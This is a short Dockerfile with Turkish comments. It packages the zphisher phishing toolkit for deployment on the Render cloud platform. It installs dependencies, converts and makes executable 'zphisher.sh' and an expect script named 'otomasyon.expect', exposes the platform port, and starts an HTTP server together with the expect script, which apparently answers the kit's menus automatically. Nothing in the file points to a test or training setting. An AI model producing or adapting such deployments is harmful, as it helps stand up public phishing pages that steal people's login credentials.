FROM debian:stable-slim

# Sadece projenin çalışması için gereken temel bağımlılıkları ve Python'ı kuruyoruz
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    dos2unix \
    expect \
    python3 \
    && rm -rf /var/lib/apt/lists/*

COPY . /app
WORKDIR /app

RUN dos2unix zphisher.sh otomasyon.expect
RUN chmod +x zphisher.sh otomasyon.expect

# Render platformunun dış dünya ile iletişim kuracağı portu açıyoruz
EXPOSE ${PORT}

# Render'ın portunu dinleyen HTTP sunucusunu ve otomasyon scriptinizi başlatıyoruz
CMD python3 -m http.server ${PORT} & expect otomasyon.expect
